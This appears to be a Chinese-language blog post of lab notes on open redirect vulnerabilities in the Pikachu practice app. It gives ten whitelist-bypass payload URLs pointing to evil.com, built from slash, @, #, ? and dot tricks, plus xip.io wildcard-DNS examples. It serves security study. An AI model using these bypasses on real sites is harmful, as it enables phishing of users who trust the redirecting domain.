---
layout: post
title: "Pickachu 不安全地址跳轉 (url 重定向)"
description: ""
date: 2023-07-11
categories:
  - Pickachu_Lab
  - Pickachu_URL_Redirection
author: ""
tags: ['Pickachu_Lab', 'URL_Redirection']
---



# Pickachu 不安全地址跳轉 (url 重定向)

###### tags: `Pickachu`

### 有時網站會接收使用者傳入的網頁，並跳轉。

url跳轉比較直接的危害是:
釣魚,既攻擊者使用漏洞方的域名(比如一個比較出名的公司域名往往會讓用戶放心的點擊)做掩蓋,而最終跳轉的確實釣魚網站




### 繞過
有時候網站會有一些規則，只允許自己網站，或特定網站可以被跳轉，這時就需要繞過。


1.單斜線”/“繞過
```
https://www.landgrey.me/redirect.php?url=/www.evil.com
```
2.缺少協議繞過
```
https://www.landgrey.me/redirect.php?url=//www.evil.com
```


3.多斜線”/“前綴繞過
```
https://www.landgrey.me/redirect.php?url=///www.evil.com https://www.landgrey.me/redirect.php?url=////www.evil.com
```


4.利⽤”@”符號繞過
```
https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com
```


5.利⽤反斜線”"繞過
```
https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me
```


6.利⽤”#”符號繞過
```
https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me
```


7.利⽤”?”號繞過
```
https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me
```


8.利⽤”\“繞過
```
https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me
```


9.利⽤”.”繞過
```
https://www.landgrey.me/redirect.php?url=.evil (可能會跳轉到www.landgrey.me.evil域名)
https://www.landgrey.me/redirect.php?url=.evil.com (可能會跳轉到evil.com域名)
```


10.重複特殊字符繞過
`https://www.landgrey.me/redirect.php?url=///www.evil.com//.. https://www.landgrey.me/redirect.php?url=////www.evil.com//..`




另外有一種 泛域名解析繞過。
xip.io

```
10.0.0.1.xip.io   resolves to   10.0.0.1
www.10.0.0.1.xip.io   resolves to   10.0.0.1
mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1

```